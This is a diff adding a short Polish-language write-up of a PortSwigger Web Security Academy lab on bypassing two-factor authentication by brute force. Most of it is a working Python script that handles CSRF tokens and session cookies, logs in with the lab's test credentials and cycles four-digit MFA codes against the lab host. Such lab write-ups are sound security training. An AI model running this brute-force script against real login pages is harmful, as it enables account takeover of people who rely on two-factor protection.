@@ -1,0 +1,64 @@
+(https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack)
+Jezeli mamy poprawne dane do zalogowania uzytkownika, a nastepnie pojawia sie wpisanie pin to mozemy to bruteforcowac.
+
+W burpie trzeba ustawic kilka makr ktore
+-> Pobierze strone /login (sciagamy token csrf)
+-> Post do /login z tokenem i danymi uwiezytalniejacymi
+-> Get do /login2 z pobranym ciasteczkiem sessji 
+-> Post do /login2 z ciasteczkiem sessji pinem(payload)
+No i sprawdzamy czy w wyniku znajduje sie Invalid jezeli tak to jedziemy dalej.
+
+Ale Zrobilem to Pythonem :) payload to 'PayloadDigits' w pliku liczby od 0001 do 9999
+[SCRIPT]
+import requests
+import time
+from concurrent.futures import ThreadPoolExecutor
+from threading import Thread
+from bs4 import BeautifulSoup
+
+def go(payload):
+    url = 'https://0a32003603465397c0d9950d00ae000e.web-security-academy.net/login'
+
+    response = requests.get(url)
+    response.encoding='utf-8'
+    header = response.headers
+    zupa = BeautifulSoup(response.text, 'html.parser')
+    tokenCSRF = zupa.find('input').attrs['value']
+    session = header['Set-Cookie'].split(';')[0].split('=')[1]
+
+    url2 = 'https://0a32003603465397c0d9950d00ae000e.web-security-academy.net/login'
+    cookie2 = {'session' : session}
+    data2 = {'csrf' : tokenCSRF, 'username' : 'carlos', 'password' : 'montoya'}
+    
+
+    response2 = requests.post(url2, cookies=cookie2, data=data2, allow_redirects=False)
+    session2 = response2.headers['Set-Cookie'].split(';')[0].split('=')[1]
+
+    url3 = 'https://0a32003603465397c0d9950d00ae000e.web-security-academy.net/login2'
+    cookie3 = {'session' : session2}
+
+    response3 = requests.get(url3, cookies=cookie3)
+
+    zupa3 = BeautifulSoup(response3.text, 'html.parser')
+    tokenCSRF3 = zupa3.find('input').attrs['value']
+
+    
+    url4 = 'https://0a32003603465397c0d9950d00ae000e.web-security-academy.net/login2'
+    cookie4 = {'session' :  session2}
+    data4 = {'csrf' : tokenCSRF3, 'mfa-code' : payload}
+
+    response4 = requests.post(url4, cookies=cookie4, data=data4)
+
+
+    if("Incorrect security code" in response4.text):
+        print('[bad]' + payload + " - " + str(len(response4.text)) + " Response code: " + str(response4.status_code))
+    else:
+        print('[success]' + payload + " - " + str(len(response4.text)))
+        input()
+
+
+
+
+data = open('PayloadDigits', 'r').read()
+for x in data.split('\n'):
+    go(x)
